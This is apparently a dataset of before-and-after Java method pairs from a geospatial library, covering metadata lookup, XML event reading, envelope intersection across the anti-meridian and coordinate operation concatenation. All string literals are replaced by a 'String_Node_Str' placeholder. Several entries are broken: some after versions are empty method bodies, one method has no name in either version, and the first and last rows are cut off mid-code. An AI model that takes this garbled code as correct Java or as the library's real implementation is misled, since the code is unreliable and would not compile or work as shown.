        value=Proxy.newProxyInstance(classloader,new Class<?>[]{type,MetadataProxy.class},new Dispatcher(identifier,this));
        pool.put(key,value);
      }
    }
    if (value == null) {
      Method method=null;
      final Class<?> subType=TableHierarchy.subType(type,identifier);
      final Dispatcher toSearch=new Dispatcher(identifier,this);
      try {
        value=subType.getConstructor().newInstance();
        final LookupInfo info=getLookupInfo(subType);
        final Map<String,Object> map=asValueMap(value);
        final Map<String,String> methods=standard.asNameMap(subType,NAME_POLICY,KeyNamePolicy.METHOD_NAME);
        for (        final Map.Entry<String,Object> entry : map.entrySet()) {
          method=subType.getMethod(methods.get(entry.getKey()));
          info.setMetadataType(subType);
          final Object p=readColumn(info,method,toSearch);
          if (p != null) {
            entry.setValue(p);
          }
        }
      }
 catch (      ReflectiveOperationException e) {
        throw new MetadataStoreException(Errors.format(Errors.Keys.UnsupportedImplementation_1,subType),e);
      }
catch (      SQLException e) {
        throw new MetadataStoreException(toSearch.error(method),e);
      }
    }
  }
  return type.cast(value);
}"
91658,"/** 
 * EPSG scripts version 8.9 seems to have 2 errors where the   {@code OBJECT_TABLE_NAME} column contains{@code ""AxisName""} instead of {@code ""Coordinate Axis Name""}.
 */
@Override @Workaround(library=""String_Node_Str"",version=""String_Node_Str"") protected void editText(final StringBuilder sql,int lower,final int upper){
  if (upper - lower == 10 && CharSequences.regionMatches(sql,++lower,""String_Node_Str"")) {
    sql.replace(lower,upper - 1,""String_Node_Str"");
  }
}","/** 
 * EPSG scripts version 8.9 seems to have 2 errors where the   {@code OBJECT_TABLE_NAME} column contains{@code ""AxisName""} instead of {@code ""Coordinate Axis Name""}. Furthermore the version number noted in the history table is a copy-and-paste error.
 */
@Override @Workaround(library=""String_Node_Str"",version=""String_Node_Str"") protected void editText(final StringBuilder sql,int lower,int upper){
  final String table;
  final String before;
  final String oldValue;
  final String newValue;
switch (upper - lower) {
default :
    return;
case 10:
{
    table=""String_Node_Str"";
    before=null;
    oldValue=""String_Node_Str"";
    newValue=""String_Node_Str"";
    break;
  }
case 38:
{
  table=""String_Node_Str"";
  before=""String_Node_Str"";
  oldValue=""String_Node_Str"";
  newValue=""String_Node_Str"";
  break;
}
}
if (CharSequences.regionMatches(sql,++lower,oldValue) && CharSequences.regionMatches(sql,0,""String_Node_Str"" + table + ""String_Node_Str"")) {
assertEquals(""String_Node_Str"",oldValue.length(),--upper - lower);
if (before != null) {
final int i=sql.indexOf(before);
if (i < 0 || i >= lower) return;
}
sql.replace(lower,upper,newValue);
}
}"
91659,"/** 
 * Tests XML unmarshalling for a metadata version. The version is not specified since it should be detected automatically.
 * @param file  file containing the metadata to unmarshal.
 */
private void testUnmarshalling(final String file) throws JAXBException {
  final DefaultCitation c=unmarshalFile(DefaultCitation.class,file);
  assertTitleEquals(""String_Node_Str"",""String_Node_Str"",c);
  final CitationDate date=getSingleton(c.getDates());
  assertEquals(""String_Node_Str"",date.getDate(),TestUtilities.date(""String_Node_Str""));
  assertEquals(""String_Node_Str"",date.getDateType(),DateType.ADOPTED);
  assertEquals(""String_Node_Str"",PresentationForm.PHYSICAL_OBJECT,getSingleton(c.getPresentationForms()));
  final Iterator<Responsibility> it=c.getCitedResponsibleParties().iterator();
  final Contact contact=assertResponsibilityEquals(Role.ORIGINATOR,""String_Node_Str"",it.next());
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(contact.getContactInstructions()));
  final OnlineResource resource=TestUtilities.getSingleton(contact.getOnlineResources());
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getName()));
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getDescription()));
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getLinkage()));
  assertEquals(""String_Node_Str"",OnLineFunction.OFFLINE_ACCESS,resource.getFunction());
  assertSame(""String_Node_Str"",contact,assertResponsibilityEquals(Role.FUNDER,""String_Node_Str"",it.next()));
  assertFalse(it.hasNext());
}","/** 
 * Tests XML unmarshalling for a metadata version. The version is not specified since it should be detected automatically.
 * @param file  file containing the metadata to unmarshal.
 */
private void testUnmarshalling(final String file) throws JAXBException {
  final DefaultCitation c=unmarshalFile(DefaultCitation.class,file);
  assertTitleEquals(""String_Node_Str"",""String_Node_Str"",c);
  final CitationDate date=getSingleton(c.getDates());
  assertEquals(""String_Node_Str"",date.getDate(),TestUtilities.date(""String_Node_Str""));
  assertEquals(""String_Node_Str"",DateType.ADOPTED,date.getDateType());
  assertEquals(""String_Node_Str"",PresentationForm.PHYSICAL_OBJECT,getSingleton(c.getPresentationForms()));
  final Iterator<Responsibility> it=c.getCitedResponsibleParties().iterator();
  final Contact contact=assertResponsibilityEquals(Role.ORIGINATOR,""String_Node_Str"",it.next());
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(contact.getContactInstructions()));
  final OnlineResource resource=TestUtilities.getSingleton(contact.getOnlineResources());
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getName()));
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getDescription()));
  assertEquals(""String_Node_Str"",""String_Node_Str"",String.valueOf(resource.getLinkage()));
  assertEquals(""String_Node_Str"",OnLineFunction.OFFLINE_ACCESS,resource.getFunction());
  assertSame(""String_Node_Str"",contact,assertResponsibilityEquals(Role.FUNDER,""String_Node_Str"",it.next()));
  assertFalse(it.hasNext());
}"
91660,"/** 
 * Writes the event as per the XML 1.0 without indentation or whitespace.
 */
@Override final void write(final Appendable out) throws IOException {
  name(out.append('<'));
  final int n=attributes.size();
  for (int i=0; i < n; i++) {
    if (i != 0)     out.append(' ');
    Attr.castOrWrap(attributes.get(i)).write(out);
  }
  out.append('>');
}","/** 
 * Writes the event as per the XML 1.0 without indentation or whitespace.
 */
@Override final void write(final Appendable out) throws IOException {
  name(out.append('<'));
  final int n=attributes.size();
  for (int i=0; i < n; i++) {
    Attr.castOrWrap(attributes.get(i)).write(out);
  }
  out.append('>');
}"
91661,"/** 
 * Returns the next element. Use   {@link #nextEvent()} instead.
 */
@Override public Object next(){
  return convert((XMLEvent)in.next(),true);
}","/** 
 * Returns the next element. Use   {@link #nextEvent()} instead.
 */
@Override public Object next(){
}"
91662,"/** 
 * Forwards the call and keep trace of the XML elements opened up to this point.
 */
@Override public XMLEvent nextTag() throws XMLStreamException {
  return convert(in.nextTag(),true);
}","/** 
 * Forwards the call and keep trace of the XML elements opened up to this point.
 */
@Override public XMLEvent nextTag() throws XMLStreamException {
}"
91663,"/** 
 * Forwards the call and keep trace of the XML elements opened up to this point.
 */
@Override public XMLEvent nextEvent() throws XMLStreamException {
  return convert(in.nextEvent(),true);
}","/** 
 * Forwards the call and keep trace of the XML elements opened up to this point.
 */
@Override public XMLEvent nextEvent() throws XMLStreamException {
}"
91664,"/** 
 * Checks if there are more events.
 */
@Override public boolean hasNext(){
  return in.hasNext();
}","/** 
 * Checks if there are more events.
 */
@Override public boolean hasNext(){
  return (nextEvent != null) || in.hasNext();
}"
91665,"/** 
 * Check the next XMLEvent without reading it from the stream.
 */
@Override public XMLEvent peek() throws XMLStreamException {
  return convert(in.peek(),false);
}","/** 
 * Checks the next   {@code XMLEvent} without removing it from the stream.
 */
@Override public XMLEvent peek() throws XMLStreamException {
  if (nextEvent == null) {
    final XMLEvent event=in.peek();
    if (event != null) {
      nextEvent=convert(event);
    }
  }
  return nextEvent;
}"
91666,"/** 
 * Returns the axis direction that matches the given string, or returns a new one if none match it. More specifically, this methods returns the first instance for which <code>  {@linkplain #name() name()}.  {@linkplain String#equals equals}(code)</code> returns   {@code true}. If no existing instance is found, then a new one is created for the given name.
 * @param code  the name of the code to fetch or to create.
 * @return a code matching the given name.
 */
public static SensorType valueOf(String code){
  return valueOf(SensorType.class,code);
}","/** 
 * Returns the sensor type that matches the given string, or returns a new one if none match it. More specifically, this methods returns the first instance for which <code>  {@linkplain #name() name()}.  {@linkplain String#equals equals}(code)</code> returns   {@code true}. If no existing instance is found, then a new one is created for the given name.
 * @param code  the name of the code to fetch or to create.
 * @return a code matching the given name.
 */
public static SensorType valueOf(String code){
  return valueOf(SensorType.class,code);
}"
91667,"/** 
 * Sets the   {@code <gco:CharacterString>},   {@code <gmx:FileName>} or {@code <gmx:MimeFileType>} value.<p>This method is invoked by JAXB at unmarshalling time and should not need to be invoked directly.</p>
 */
private void setValue(final Object value){
  if (value instanceof Anchor) {
    setText((Anchor)value,ANCHOR);
  }
 else   if (value instanceof FileName) {
    setText(value.toString(),FILENAME);
  }
 else   if (value instanceof MimeFileType) {
    setText(value.toString(),MIME_TYPE);
  }
 else {
    setText((CharSequence)value,(byte)0);
  }
}","/** 
 * Sets the   {@code <gco:CharacterString>},   {@code <gmx:FileName>} or {@code <gmx:MimeFileType>} value.<p>This method is invoked by JAXB at unmarshalling time and should not need to be invoked directly.</p>
 */
@SuppressWarnings(""String_Node_Str"") private void setValue(final Object value){
  if (value instanceof Anchor) {
    setText((Anchor)value,ANCHOR);
  }
 else   if (value instanceof FileName) {
    setText(value.toString(),FILENAME);
  }
 else   if (value instanceof MimeFileType) {
    setText(value.toString(),MIME_TYPE);
  }
 else {
    setText((CharSequence)value,(byte)0);
  }
}"
91668,"/** 
 * Concatenates three transformation steps. If the first and/or the last operation is an   {@link #AXIS_CHANGES}, then it will be included as part of the second operation instead of creating a   {@link ConcatenatedOperation}. If a concatenated operation is created, it will get an automatically generated name.
 * @param step1  the first  step, or {@code null} for the identity operation.
 * @param step2  the second step, or {@code null} for the identity operation.
 * @param step3  the third  step, or {@code null} for the identity operation.
 * @return a concatenated operation, or {@code null} if all arguments were null.
 * @throws FactoryException if the operation can not be constructed.
 */
private CoordinateOperation concatenate(final CoordinateOperation step1,final CoordinateOperation step2,final CoordinateOperation step3) throws FactoryException {
  if (isIdentity(step1))   return concatenate(step2,step3);
  if (isIdentity(step2))   return concatenate(step1,step3);
  if (isIdentity(step3))   return concatenate(step1,step2);
  if (step1.getName() == AXIS_CHANGES)   return concatenate(concatenate(step1,step2),step3);
  if (step3.getName() == AXIS_CHANGES)   return concatenate(step1,concatenate(step2,step3));
  final Map<String,?> properties=defaultName(step1.getSourceCRS(),step3.getTargetCRS());
  return factory.createConcatenatedOperation(properties,step1,step2,step3);
}","/** 
 * Concatenates three transformation steps. If the first and/or the last operation is an   {@link #AXIS_CHANGES}, then it will be included as part of the second operation instead of creating a   {@link ConcatenatedOperation}. If a concatenated operation is created, it will get an automatically generated name.
 * @param step1  the first  step, or {@code null} for the identity operation.
 * @param step2  the second step, or {@code null} for the identity operation.
 * @param step3  the third  step, or {@code null} for the identity operation.
 * @return a concatenated operation, or {@code null} if all arguments were null.
 * @throws FactoryException if the operation can not be constructed.
 */
private CoordinateOperation concatenate(final CoordinateOperation step1,final CoordinateOperation step2,final CoordinateOperation step3) throws FactoryException {
  if (isIdentity(step1))   return concatenate(step2,step3);
  if (isIdentity(step2))   return concatenate(step1,step3);
  if (isIdentity(step3))   return concatenate(step1,step2);
  if (canHide(step1.getName()))   return concatenate(concatenate(step1,step2),step3);
  if (canHide(step3.getName()))   return concatenate(step1,concatenate(step2,step3));
  final Map<String,?> properties=defaultName(step1.getSourceCRS(),step3.getTargetCRS());
  return factory.createConcatenatedOperation(properties,step1,step2,step3);
}"
91669,"/** 
 * Returns   {@code true} if the specified operation is an identity conversion.This method always returns  {@code false} for transformations even if theirassociated math transform is an identity one, because such transformations are usually datum shift and must be visible.
 */
private static boolean isIdentity(final CoordinateOperation operation){
  return (operation == null) || ((operation instanceof Conversion) && operation.getMathTransform().isIdentity());
}","/** 
 * Returns   {@code true} if the specified operation is an identity conversion.This method always returns  {@code false} for transformations even if theirassociated math transform is an identity one, because such transformations are usually datum shift and must be visible.
 */
private static boolean isIdentity(final CoordinateOperation operation){
  if (operation == null) {
    return true;
  }
  if ((operation instanceof Conversion) && operation.getMathTransform().isIdentity()) {
    return CoordinateOperations.wrapAroundChanges(operation).isEmpty();
  }
  return false;
}"
91670,"/** 
 * Creates a rectangle for the given CRS and coordinate values.
 */
@Override Rectangle2D createFromExtremums(CoordinateReferenceSystem crs,double xmin,double ymin,double xmax,double ymax){
  return new Rectangle2D.Double(xmin,ymin,xmax - xmin,ymax - ymin);
}","/** 
 * Creates a rectangle for the given CRS and coordinate values.
 */
@Override Rectangle2D createFromExtremums(CoordinateReferenceSystem crs,double xmin,double ymin,double xmax,double ymax){
  if (xmin > xmax) {
    final CoordinateSystemAxis axis=crs.getCoordinateSystem().getAxis(0);
    xmin=axis.getMinimumValue();
    xmax=axis.getMaximumValue();
  }
  return new Rectangle2D.Double(xmin,ymin,xmax - xmin,ymax - ymin);
}"
91671,"/** 
 * Tests transform of an envelope over the 180 limit. The Mercator projection used in this test is not expected to wrap the longitude around Earth when using only the   {@code MathTransform}. However when the target CRS is known, then ""wrap around"" should be applied.
 * @throws TransformException if an error occurred while transforming the envelope.
 * @since 0.8
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testTransformOverAntiMeridian() throws TransformException {
  final ProjectedCRS sourceCRS=HardCodedConversions.mercator();
  final GeographicCRS targetCRS=sourceCRS.getBaseCRS();
  final Conversion conversion=inverse(sourceCRS.getConversionFromBase());
  final G expected=createFromExtremums(targetCRS,179,40,181,50);
  final G rectangle=createFromExtremums(sourceCRS,19926188.852,4838471.398,20148827.834,6413524.594);
  final G actual=transform(conversion,rectangle);
  assertGeometryEquals(expected,actual,ANGULAR_TOLERANCE,ANGULAR_TOLERANCE);
}","/** 
 * Tests transform of an envelope over the 180 limit. The Mercator projection used in this test is not expected to wrap the longitude around Earth when using only the   {@code MathTransform}. However when the target CRS is known, then ""wrap around"" should be applied.
 * @throws TransformException if an error occurred while transforming the envelope.
 * @since 0.8
 */
@Test @DependsOnMethod(""String_Node_Str"") public final void testTransformOverAntiMeridian() throws TransformException {
  final ProjectedCRS sourceCRS=HardCodedConversions.mercator();
  final GeographicCRS targetCRS=sourceCRS.getBaseCRS();
  final Conversion conversion=inverse(sourceCRS.getConversionFromBase());
  final G expected=createFromExtremums(targetCRS,179,40,181,50);
  final G rectangle=createFromExtremums(sourceCRS,19926188.852,4838471.398,20148827.834,6413524.594);
  final G actual=transform(conversion,rectangle);
  assertGeometryEquals(expected,actual,ANGULAR_TOLERANCE,ANGULAR_TOLERANCE);
}"
91672,"/** 
 * Asserts that two envelopes have the same minimum and maximum ordinates. This method ignores the envelope type (i.e. the implementation class) and the CRS.
 * @param expected    the expected envelope.
 * @param actual      the envelope to compare with the expected one.
 * @param tolerances  the tolerance threshold on location along each axis. If this array length is shorterthan the number of dimensions, then the last tolerance is reused for all remaining axes. If this array is empty, then the tolerance threshold is zero.
 * @since 0.7
 */
public static void assertEnvelopeEquals(final Envelope expected,final Envelope actual,final double... tolerances){
  final int dimension=expected.getDimension();
  assertEquals(""String_Node_Str"",dimension,actual.getDimension());
  double tolerance=0;
  for (int i=0; i < dimension; i++) {
    if (i < tolerances.length) {
      tolerance=tolerances[i];
    }
    if (abs(expected.getMinimum(i) - actual.getMinimum(i)) > tolerance || abs(expected.getMaximum(i) - actual.getMaximum(i)) > tolerance) {
      fail(""String_Node_Str"" + ""String_Node_Str"" + Envelopes.toString(expected) + ""String_Node_Str""+ ""String_Node_Str""+ Envelopes.toString(actual));
    }
  }
}","/** 
 * Asserts that two envelopes have the same minimum and maximum ordinates. This method ignores the envelope type (i.e. the implementation class) and the CRS.
 * @param expected    the expected envelope.
 * @param actual      the envelope to compare with the expected one.
 * @param tolerances  the tolerance threshold on location along each axis. If this array length is shorterthan the number of dimensions, then the last tolerance is reused for all remaining axes. If this array is empty, then the tolerance threshold is zero.
 * @since 0.7
 */
public static void assertEnvelopeEquals(final Envelope expected,final Envelope actual,final double... tolerances){
  final int dimension=expected.getDimension();
  assertEquals(""String_Node_Str"",dimension,actual.getDimension());
  final DirectPosition expectedLower=expected.getLowerCorner();
  final DirectPosition expectedUpper=expected.getUpperCorner();
  final DirectPosition actualLower=actual.getLowerCorner();
  final DirectPosition actualUpper=actual.getUpperCorner();
  double tolerance=0;
  for (int i=0; i < dimension; i++) {
    if (i < tolerances.length) {
      tolerance=tolerances[i];
    }
    if (abs(expectedLower.getOrdinate(i) - actualLower.getOrdinate(i)) > tolerance || abs(expectedUpper.getOrdinate(i) - actualUpper.getOrdinate(i)) > tolerance) {
      fail(""String_Node_Str"" + i + ""String_Node_Str""+ ""String_Node_Str""+ Envelopes.toString(expected)+ ""String_Node_Str""+ ""String_Node_Str""+ Envelopes.toString(actual));
    }
  }
}"
91673,"/** 
 * Returns   {@code true} if this envelope completely encloses the specified rectangle. If thisenvelope or the given rectangle have at least one  {@link java.lang.Double#NaN NaN} value,then this method returns  {@code false}. <div class=""section"">Spanning the anti-meridian of a Geographic CRS</div> This method supports anti-meridian spanning in the same way than  {@link AbstractEnvelope#contains(Envelope)}.
 * @param rx  the <var>x</var> ordinate of the lower corner of the rectangle to test for inclusion.
 * @param ry  the <var>y</var> ordinate of the lower corner of the rectangle to test for inclusion.
 * @param rw  the width of the rectangle to test for inclusion. May be negative if the rectangle spans the anti-meridian.
 * @param rh  the height of the rectangle to test for inclusion. May be negative.
 * @return {@code true} if this envelope completely encloses the specified one.
 */
@Override public boolean contains(final double rx,final double ry,final double rw,final double rh){
  for (int i=0; i != DIMENSION; i++) {
    final double min0, min1, span0, span1;
    if (i == 0) {
      min0=x;
      span0=width;
      min1=rx;
      span1=rw;
    }
 else {
      min0=y;
      span0=height;
      min1=ry;
      span1=rh;
    }
    final boolean minCondition=(min1 >= min0);
    final boolean maxCondition=(min1 + span1 <= min0 + span0);
    if (minCondition & maxCondition) {
      if (!isNegativeUnsafe(span1) || isNegativeUnsafe(span0)) {
        continue;
      }
      if (span0 >= AbstractEnvelope.getSpan(getAxis(getCoordinateReferenceSystem(),i))) {
        continue;
      }
    }
 else     if (minCondition != maxCondition) {
      if (isNegative(span0) && isPositive(span1)) {
        continue;
      }
    }
    return false;
  }
  return true;
}","/** 
 * Returns   {@code true} if this envelope completely encloses the specified rectangle. If thisenvelope or the given rectangle have at least one  {@link java.lang.Double#NaN NaN} value,then this method returns  {@code false}. <div class=""section"">Spanning the anti-meridian of a Geographic CRS</div> This method supports anti-meridian spanning in the same way than  {@link AbstractEnvelope#contains(Envelope)}.
 * @param rx  the <var>x</var> ordinate of the lower corner of the rectangle to test for inclusion.
 * @param ry  the <var>y</var> ordinate of the lower corner of the rectangle to test for inclusion.
 * @param rw  the width of the rectangle to test for inclusion. May be negative if the rectangle spans the anti-meridian.
 * @param rh  the height of the rectangle to test for inclusion. May be negative.
 * @return {@code true} if this envelope completely encloses the specified one.
 */
@Override public boolean contains(final double rx,final double ry,final double rw,final double rh){
  for (int i=0; i != DIMENSION; i++) {
    final double min0, min1, span0, span1;
    if (i == 0) {
      min0=x;
      span0=width;
      min1=rx;
      span1=rw;
    }
 else {
      min0=y;
      span0=height;
      min1=ry;
      span1=rh;
    }
    final boolean minCondition=(min1 >= min0);
    final boolean maxCondition=(min1 + span1 <= min0 + span0);
    if (minCondition & maxCondition) {
      if (!isNegativeUnsafe(span1) || isNegativeUnsafe(span0)) {
        continue;
      }
      if (span0 >= AbstractEnvelope.getSpan(getAxis(crs,i))) {
        continue;
      }
    }
 else     if (minCondition != maxCondition) {
      if (isNegative(span0) && isPositive(span1)) {
        continue;
      }
    }
 else     if (isNegativeZero(span0)) {
      continue;
    }
    return false;
  }
  return true;
}"
91674,"/** 
 * Asserts that the intersection of the two following envelopes is equals to the given rectangle. First, this method tests using the   {@link Envelope2D} implementation. Then, it tests using the{@link GeneralEnvelope} implementation.
 */
private static void assertIntersectEquals(final GeneralEnvelope e1,final GeneralEnvelope e2,final double xmin,final double ymin,final double xmax,final double ymax){
  final boolean isEmpty=!(((xmax - xmin) * (ymax - ymin)) != 0);
  final Envelope2D r1=new Envelope2D(e1);
  final Envelope2D r2=new Envelope2D(e2);
  final Envelope2D ri=r1.createIntersection(r2);
  assertEquals(""String_Node_Str"",isEmpty,r1.isEmpty());
  assertEnvelopeEquals(ri,xmin,ymin,xmax,ymax);
  assertEquals(""String_Node_Str"",ri,r2.createIntersection(r1));
  final GeneralEnvelope ei=new GeneralEnvelope(e1);
  ei.intersect(e2);
  assertEquals(""String_Node_Str"",isEmpty,e1.isEmpty());
  assertEnvelopeEquals(ei,xmin,ymin,xmax,ymax);
  assertTrue(""String_Node_Str"",ei.equals(ri,STRICT,false));
  ei.setEnvelope(e2);
  ei.intersect(e1);
  assertEquals(""String_Node_Str"",isEmpty,e1.isEmpty());
  assertEnvelopeEquals(ei,xmin,ymin,xmax,ymax);
  assertTrue(""String_Node_Str"",ei.equals(ri,STRICT,false));
}","/** 
 * Asserts that the intersection of the two following envelopes is equals to the given rectangle. First, this method tests using the   {@link Envelope2D} implementation. Then, it tests using the{@link GeneralEnvelope} implementation.
 */
private static void assertIntersectEquals(final GeneralEnvelope e1,final GeneralEnvelope e2,final double xmin,final double ymin,final double xmax,final double ymax){
  final Envelope2D r1=new Envelope2D(e1);
  final Envelope2D r2=new Envelope2D(e2);
  final Envelope2D ri=r1.createIntersection(r2);
  assertFalse(""String_Node_Str"",r1.isEmpty());
  assertEnvelopeEquals(ri,xmin,ymin,xmax,ymax);
  assertEquals(""String_Node_Str"",ri,r2.createIntersection(r1));
  final GeneralEnvelope ei=new GeneralEnvelope(e1);
  ei.intersect(e2);
  assertFalse(""String_Node_Str"",e1.isEmpty());
  assertEnvelopeEquals(ei,xmin,ymin,xmax,ymax);
  assertTrue(""String_Node_Str"",ei.equals(ri,STRICT,false));
  ei.setEnvelope(e2);
  ei.intersect(e1);
  assertFalse(""String_Node_Str"",e1.isEmpty());
  assertEnvelopeEquals(ei,xmin,ymin,xmax,ymax);
  assertTrue(""String_Node_Str"",ei.equals(ri,STRICT,false));
}"
91675,"/** 
 * Tests the   {@link GeneralEnvelope#intersect(Envelope)} and{@link Envelope2D#createIntersection(Rectangle2D)} methods.
 */
@Test public void testIntersection(){
  final GeneralEnvelope e1=create(20,-20,80,10);
  final GeneralEnvelope e2=create(40,-10,62,8);
  assertIntersectEquals(e1,e2,40,-10,62,8);
  e1.setEnvelope(20,-20,80,12);
  e2.setEnvelope(40,-10,100,30);
  final double ymin=-10, ymax=12;
  assertIntersectEquals(e1,e2,40,ymin,80,ymax);
  e1.setRange(0,80,20);
  e2.setRange(0,100,18);
  assertIntersectEquals(e1,e2,100,ymin,18,ymax);
  e2.setRange(0,100,90);
  assertIntersectEquals(e1,e2,100,ymin,20,ymax);
  e2.setRange(0,10,30);
  assertIntersectEquals(e1,e2,10,ymin,20,ymax);
  e2.setRange(0,10,16);
  assertIntersectEquals(e1,e2,10,ymin,16,ymax);
  e2.setRange(0,40,60);
  assertIntersectEquals(e1,e2,NaN,ymin,NaN,ymax);
  e2.setRange(0,10,90);
  assertIntersectEquals(e1,e2,NaN,ymin,NaN,ymax);
  verifyInvariants(e1);
  verifyInvariants(e2);
}","/** 
 * Tests the   {@link GeneralEnvelope#intersect(Envelope)} and{@link Envelope2D#createIntersection(Rectangle2D)} methods.
 */
@Test public void testIntersection(){
  final GeneralEnvelope e1=create(20,-20,80,10);
  final GeneralEnvelope e2=create(40,-10,62,8);
  assertIntersectEquals(e1,e2,40,-10,62,8);
  e1.setEnvelope(20,-20,80,12);
  e2.setEnvelope(40,-10,100,30);
  final double ymin=-10, ymax=12;
  assertIntersectEquals(e1,e2,40,ymin,80,ymax);
  e1.setRange(0,80,20);
  e2.setRange(0,100,18);
  assertIntersectEquals(e1,e2,100,ymin,18,ymax);
  e2.setRange(0,100,90);
  assertIntersectEquals(e1,e2,100,ymin,20,ymax);
  e2.setRange(0,10,30);
  assertIntersectEquals(e1,e2,10,ymin,20,ymax);
  e2.setRange(0,10,16);
  assertIntersectEquals(e1,e2,10,ymin,16,ymax);
  e2.setRange(0,40,60);
  assertIntersectEquals(e1,e2,NaN,ymin,NaN,ymax);
  e2.setRange(0,10,90);
  assertIntersectEquals(e1,e2,NaN,ymin,NaN,ymax);
  e1.setRange(0,0.0,-0.0);
  e2.setRange(0,-10,30);
  assertIntersectEquals(e1,e2,-10,ymin,30,ymax);
  e1.setRange(0,0.0,-0.0);
  e2.setRange(0,0.0,-0.0);
  assertIntersectEquals(e1,e2,0.0,ymin,-0.0,ymax);
  verifyInvariants(e1);
  verifyInvariants(e2);
}"
91676,"/** 
 * Computes the latitude using equation 3-18 from Synder, followed by iterative resolution of Synder 3-16. In theory, the series expansion given by equation 3-18 (  csin(2) + csin(4) + csin(8)) should be used in replacement of the iterative method. However in practice the series expansion seems to not have a sufficient amount of terms for achieving the centimetric precision, so we ""finish"" it by the iterative method. The series expansion is nevertheless useful for reducing the number of iterations.
 * @param y  in the cylindrical case, this is northing on the normalized ellipsoid.
 * @return the latitude in radians.
 */
final double (final double y) throws ProjectionException {
}","/** 
 * Computes the latitude using equation 3-18 from Snyder, followed by iterative resolution of Snyder 3-16. In theory, the series expansion given by equation 3-18 (  csin(2) + csin(4) + csin(8)) should be used in replacement of the iterative method. However in practice the series expansion seems to not have a sufficient amount of terms for achieving the centimetric precision, so we ""finish"" it by the iterative method. The series expansion is nevertheless useful for reducing the number of iterations.
 * @param y  in the cylindrical case, this is northing on the normalized ellipsoid.
 * @return the latitude in radians.
 */
final double (final double y) throws ProjectionException {
}"
91677,"/** 
 * Lookups objects which are approximatively equal to the specified object. The default implementation tries to instantiate some   {@linkplain AbstractIdentifiedObject identified objects}from the authority factory specified at construction time, in the following order: <ul> <li>If the specified object contains   {@linkplain AbstractIdentifiedObject#getIdentifiers() identifiers}associated to the same authority than the factory, then those identifiers are used for  {@linkplain GeodeticAuthorityFactory#createObject(String) creating objects} to be tested.</li><li>If the authority factory can create objects from their  {@linkplain AbstractIdentifiedObject#getName() name}in addition of identifiers, then the name and   {@linkplain AbstractIdentifiedObject#getAlias() aliases} areused for creating objects to be tested.</li> <li>If a full scan of the dataset is allowed, then full  {@linkplain #getCodeCandidates set of candidate codes}is used for creating objects to be tested.</li> </ul> The created objects which are equal to the specified object in the the sense of   {@link ComparisonMode#APPROXIMATIVE} are returned.
 * @param object  the object looked up.
 * @return the identified objects, or an empty set if not found.
 * @throws FactoryException if an error occurred while creating an object.
 */
public Set<IdentifiedObject> find(final IdentifiedObject object) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",object);
  Set<IdentifiedObject> result=getFromCache(object);
  if (result == null) {
    final AuthorityFactoryProxy<?> previous=proxy;
    proxy=AuthorityFactoryProxy.getInstance(object.getClass());
    try {
      if (!ignoreIdentifiers) {
        IdentifiedObject candidate=createFromIdentifiers(object);
        if (candidate != null) {
          return Collections.singleton(candidate);
        }
        candidate=createFromNames(object);
        if (candidate != null) {
          return Collections.singleton(candidate);
        }
      }
      if (domain == Domain.DECLARATION) {
        return Collections.emptySet();
      }
      result=createFromCodes(object);
    }
  finally {
      proxy=previous;
    }
    result=cache(object,result);
  }
  return result;
}","/** 
 * Lookups objects which are approximatively equal to the specified object. The default implementation tries to instantiate some   {@linkplain AbstractIdentifiedObject identified objects}from the authority factory specified at construction time, in the following order: <ul> <li>If the specified object contains   {@linkplain AbstractIdentifiedObject#getIdentifiers() identifiers}associated to the same authority than the factory, then those identifiers are used for  {@linkplain GeodeticAuthorityFactory#createObject(String) creating objects} to be tested.</li><li>If the authority factory can create objects from their  {@linkplain AbstractIdentifiedObject#getName() name}in addition of identifiers, then the name and   {@linkplain AbstractIdentifiedObject#getAlias() aliases} areused for creating objects to be tested.</li> <li>If a full scan of the dataset is allowed, then full  {@linkplain #getCodeCandidates set of candidate codes}is used for creating objects to be tested.</li> </ul> The created objects which are equal to the specified object in the the sense of   {@link ComparisonMode#APPROXIMATIVE} are returned.
 * @param object  the object looked up.
 * @return the identified objects, or an empty set if not found.
 * @throws FactoryException if an error occurred while creating an object.
 */
public Set<IdentifiedObject> find(final IdentifiedObject object) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",object);
  Set<IdentifiedObject> result=getFromCache(object);
  if (result == null) {
    final AuthorityFactoryProxy<?> previous=proxy;
    proxy=AuthorityFactoryProxy.getInstance(object.getClass());
    try {
      if (!ignoreIdentifiers && !ignoreAxes) {
        IdentifiedObject candidate=createFromIdentifiers(object);
        if (candidate != null) {
          return Collections.singleton(candidate);
        }
        candidate=createFromNames(object);
        if (candidate != null) {
          return Collections.singleton(candidate);
        }
      }
      if (domain == Domain.DECLARATION) {
        return Collections.emptySet();
      }
      result=createFromCodes(object);
    }
  finally {
      proxy=previous;
    }
    result=cache(object,result);
  }
  return result;
}"
91678,"/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws IncommensurableException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, IncommensurableException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Collection<CoordinateOperation> operations;
  boolean mdOnly=Semaphores.queryAndSet(Semaphores.METADATA_ONLY);
  try {
    try {
